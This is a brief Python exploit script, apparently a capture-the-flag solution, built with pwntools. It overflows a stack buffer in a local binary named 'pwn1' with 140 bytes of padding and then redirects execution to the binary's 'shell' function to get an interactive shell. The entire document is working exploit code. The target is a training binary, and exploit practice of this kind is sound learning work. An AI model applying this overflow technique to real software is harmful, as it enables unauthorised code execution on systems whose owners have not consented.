from pwn import *

elf = ELF('./pwn1')

# target_address = elf.symbols['shell']
# print ('target address:\t', hex(target_address))
#restituisce 0x80484ad

garbage = b'a'*(140)
target_address = p32(elf.symbols['shell']) 
msgin = garbage + target_address 
p = process('./pwn1') 
p.sendline(msgin)
p.interactive()
